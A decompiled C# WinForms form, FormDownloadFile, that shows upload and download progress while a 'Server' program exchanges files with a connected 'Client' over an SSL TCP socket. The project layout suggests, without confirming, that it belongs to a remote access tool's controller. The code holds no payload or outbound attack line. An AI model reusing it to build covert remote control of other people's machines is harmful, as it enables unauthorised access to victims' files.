using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Server.Connection;
using Server.Helper;
using Siticone.Desktop.UI.WinForms;

namespace Server.Forms
{
	// Token: 0x020000A8 RID: 168
	public partial class FormDownloadFile : Form
	{
		// Token: 0x170000C9 RID: 201
		// (get) Token: 0x0600053D RID: 1341 RVA: 0x00004C5C File Offset: 0x00002E5C
		// (set) Token: 0x0600053E RID: 1342 RVA: 0x00004C64 File Offset: 0x00002E64
		public FormMain F { get; set; }

		// Token: 0x170000CA RID: 202
		// (get) Token: 0x0600053F RID: 1343 RVA: 0x00004C6D File Offset: 0x00002E6D
		// (set) Token: 0x06000540 RID: 1344 RVA: 0x00004C75 File Offset: 0x00002E75
		internal Clients Client { get; set; }

		// Token: 0x06000541 RID: 1345 RVA: 0x00004C7E File Offset: 0x00002E7E
		public FormDownloadFile()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000542 RID: 1346 RVA: 0x00045C1C File Offset: 0x00043E1C
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (this.FileSize >= 2147483647L)
			{
				this.timer1.Stop();
				MessageBox.Show("Don't support files larger than 2GB.");
				base.Dispose();
				return;
			}
			if (!this.IsUpload)
			{
				this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.Client.BytesRecevied);
				if (this.Client.BytesRecevied >= this.FileSize)
				{
					this.labelsize.Text = "Downloaded";
					this.labelsize.ForeColor = Color.Green;
					this.timer1.Stop();
					return;
				}
			}
			else
			{
				this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.BytesSent);
				if (this.BytesSent >= this.FileSize)
				{
					this.labelsize.Text = "Uploaded";
					this.labelsize.ForeColor = Color.Green;
					this.timer1.Stop();
				}
			}
		}

		// Token: 0x06000543 RID: 1347 RVA: 0x00045D34 File Offset: 0x00043F34
		private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				Clients client = this.Client;
				if (client != null)
				{
					client.Disconnected();
				}
				Timer timer = this.timer1;
				if (timer != null)
				{
					timer.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000544 RID: 1348 RVA: 0x00045D78 File Offset: 0x00043F78
		public void Send(object obj)
		{
			object sendSync = this.Client.SendSync;
			lock (sendSync)
			{
				try
				{
					this.IsUpload = true;
					byte[] array = (byte[])obj;
					byte[] bytes = BitConverter.GetBytes(array.Length);
					this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
					this.Client.SslClient.Write(bytes, 0, bytes.Length);
					using (MemoryStream memoryStream = new MemoryStream(array))
					{
						memoryStream.Position = 0L;
						byte[] array2 = new byte[50000];
						int num;
						while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
						{
							this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
							this.Client.SslClient.Write(array2, 0, num);
							this.BytesSent += (long)num;
						}
					}
					Program.form1.BeginInvoke(new MethodInvoker(delegate()
					{
						base.Close();
					}));
				}
				catch
				{
					Clients client = this.Client;
					if (client != null)
					{
						client.Disconnected();
					}
					Program.form1.BeginInvoke(new MethodInvoker(delegate()
					{
						this.labelsize.Text = "Error";
						this.labelsize.ForeColor = Color.Red;
					}));
				}
			}
		}

		// Token: 0x040004C1 RID: 1217
		public long FileSize;

		// Token: 0x040004C2 RID: 1218
		private long BytesSent;

		// Token: 0x040004C3 RID: 1219
		public string FullFileName;

		// Token: 0x040004C4 RID: 1220
		public string ClientFullFileName;

		// Token: 0x040004C5 RID: 1221
		private bool IsUpload;

		// Token: 0x040004C6 RID: 1222
		public string DirPath;
	}
}
